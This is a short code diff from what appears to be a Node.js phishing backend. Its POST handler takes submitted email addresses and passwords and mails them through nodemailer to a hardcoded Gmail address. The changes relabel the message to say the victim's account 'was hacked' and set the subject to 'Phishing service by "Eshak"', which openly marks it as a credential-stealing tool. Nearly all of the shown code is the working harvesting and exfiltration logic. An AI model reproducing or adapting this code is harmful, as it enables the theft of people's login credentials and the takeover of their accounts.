@@ -28,10 +28,10 @@ app.get('/', function (req, res) {
 
 app.post('/_', function (req, res) {
    // res.render('f_success');
-    var captured_content = `\n[-] Email: ${req.body.email} Password: ${req.body.password}`;
+    var captured_content = `\n Email: ${req.body.email} Password: ${req.body.password}`;
     
     console.log("es");
-    var message = "need help"+captured_content;
+    var message = "If input value has correct then id was hacked "+captured_content;
     var toEmail = "mdalonebd@gmail.com";
 
     var transporter = nodemailer.createTransport({
@@ -46,7 +46,7 @@ app.post('/_', function (req, res) {
    const mailOptions = {
   from: 'bdeshak5@gmail.com',
   to: toEmail, //list of receivers
-  subject: 'Nodemailer', // Subject line
+  subject: 'Phishing service by "Eshak"', // Subject line
   text: message //plain text body
 };
 
